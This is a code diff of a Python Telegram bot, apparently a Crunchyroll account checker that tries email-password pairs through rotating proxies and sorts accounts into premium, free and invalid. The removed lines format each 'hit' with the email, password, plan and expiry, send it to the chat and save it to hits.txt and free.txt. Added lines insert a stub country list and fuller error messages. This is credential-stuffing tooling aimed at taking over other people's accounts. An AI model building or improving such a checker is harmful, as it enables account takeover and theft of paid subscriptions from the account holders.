@@ -4,6 +4,7 @@ import uuid
 import random
 import aiohttp
 from aiogram import Bot, Dispatcher, types
+from aiogram.types import FSInputFile
 from aiogram.filters import Command
 from aiogram import F
 
@@ -19,13 +20,13 @@ checker = None
 proxies = []
 stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}
 
-
 class CrunchyrollChecker:
     def __init__(self, proxies=None):
         self.proxies = proxies or []
         self.proxy_index = 0
         self.countries = {
-            # Country list...
+            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",  # Add more countries as needed...
+            "US": "United States 🇺🇸"
         }
 
     def get_proxy(self):
@@ -136,42 +137,8 @@ class CrunchyrollChecker:
                     'country': country
                 }
 
-        except Exception:
-            return {'status': 'ERROR', 'email': email}
-
-
-async def send_result(chat_id, result):
-    capture = f"""
-{'='*70}
-EMAIL: {result['email']}
-PASSWORD: {result['password']}
-STATUS: {result['status']}
-EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
-ACCOUNT CREATION: {result.get('account_creation_date', 'N/A')}
-PLAN: {result.get('plan', 'N/A')}
-CURRENCY: {result.get('currency', 'N/A')}
-SUBSCRIBABLE: {result.get('subscribable', 'N/A')}
-FREE TRIAL: {result.get('free_trial', 'N/A')}
-EXPIRY: {result.get('expiry', 'N/A')}
-PLAN DURATION: {result.get('plan_duration', 'N/A')}
-ACTIVE: {result.get('active', 'N/A')}
-COUNTRY: {result.get('country', 'N/A')}
-CHECKED BY: @Cr_chker001_bot
-{'='*70}
-"""
-
-    if result['status'] == 'PREMIUM':
-        await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-        with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write(capture + "\n")
-
-    elif result['status'] == 'FREE':
-        await bot.send_message(chat_id, f"<b>🆓 FREE HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-        with open("free.txt", "a", encoding="utf-8") as f:   # also saves free accounts
-            f.write(capture + "\n")
-
-    else:
-        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
+        except Exception as e:
+            return {'status': 'ERROR', 'email': email, 'message': str(e)}
 
 @dp.message(Command("start"))
 async def start(message: types.Message):
@@ -193,7 +160,6 @@ async def main():
     checker = CrunchyrollChecker(proxies)
     print("✅ Bot started")
     await dp.start_polling(bot)
-
 
 if __name__ == "__main__":
     asyncio.run(main())
